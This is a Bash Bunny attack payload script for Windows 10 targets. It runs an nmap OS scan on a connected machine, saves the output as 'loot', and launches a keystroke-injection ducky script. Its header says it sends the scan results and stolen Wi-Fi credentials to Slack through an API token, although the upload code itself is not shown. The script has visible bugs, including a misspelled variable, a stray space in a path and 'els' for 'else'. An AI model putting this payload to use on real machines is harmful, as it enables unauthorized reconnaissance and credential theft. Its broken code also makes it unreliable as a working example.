#!/bin/bash

# @title: Nmap to Slack for Bashbunny
# @author: Harsimran Sidhu
# @version: 1.0
# @target: Windows 10
#
#
# @details: This attack will attempt to upload nmap result to slack , or 
# save it in the loot doc
# Scripts is able to load wifi creds to slack by using your SLACK api token.
#
#
# Colors:
#         Purple: starts the attack payload
#         Green: successful execution
#         Red: failure to load dependency ducky script
#

NMAP_OPTIONS="-O --fuzzy"
LOOTDIR=/root/udisk/loot/nmap


LED SETUP

ATTACKMODE RNDIS_ETHERNET
GET TARGET_IP
GET TARGET_HOSTNAME

GET SWITCH_POSITION

####> MAke LOOT dir
mkdir -p $LOOTDIR
HOST=${TARGET_HOSTNAME}
#if hostname is blank set it to "nonames"
[[ -z "$HOSt" ]] && HOST="noname"
COUNT=$(ls -lad $ LOOTDIR/$HOST*.log | wc -l)
COUNT=$((COUNT+1))

###> ERROR NO IP <!!!
if [ -z "${TARGET_IP}" ]; then
    LED FAIL
	exit 1
fi

###>ATTACK !
LED ATTACK
nmap $NMAP_OPTIONS $TARGET_IP >> $LOOTDIR/$HOST-$COUNT.log

####> uploading to slack 
LED STAGE1
sync



if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/ducky_script.txt" ]; then
       QUACK ${SWITCH_POSITION}/ducky_script.txt
          LED FINISH
els
    LED FAIL
    echo "Unable to load ducky_script.txt" >> /root/debuglog.txt
        exit 1
fi
